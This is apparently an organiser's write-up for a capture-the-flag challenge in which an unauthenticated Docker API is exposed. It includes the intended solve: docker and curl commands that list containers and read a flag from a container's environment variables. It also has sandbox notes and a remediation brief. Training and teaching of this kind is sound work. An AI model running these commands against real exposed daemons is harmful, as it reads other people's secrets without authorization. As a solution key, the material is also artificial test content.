# 08 — The Careless Container (Ceylon Kade)

**Category:** Container exposure · **Difficulty:** Medium · **Points:** 200 (dynamic)

## Intended solve
```sh
export DOCKER_HOST=tcp://<vm-ip>:8008
docker ps                       # list containers -> see "ceylon-inventory"
docker inspect ceylon-inventory | jq '.[0].Config.Env'   # FLAG=CYPHER{...}
# or over raw HTTP:
curl http://<vm-ip>:8008/containers/json
curl http://<vm-ip>:8008/containers/ceylon-inventory/json
```

## Infra & safety
- The exposed daemon is a **Docker-in-Docker (`docker:dind`) sandbox** (compose
  service `c08-dind`), not the host daemon. Even a full breakout lands inside the
  throwaway DinD, never on the Compute Engine host.
- `provision.sh` starts the inner `ceylon-inventory` container with the flag in
  its `FLAG` env var, using the run-time `CHAL_FLAG`.
- This challenge only **reads** a container's environment — no host escape required
  (that softening is deliberate, per the Phase 1 brief).

## Remediation (Blue Team Brief)
Never expose the Docker API (2375) unauthenticated; use TLS + client certs or a
socket proxy; keep secrets out of container env; network-segment the daemon.
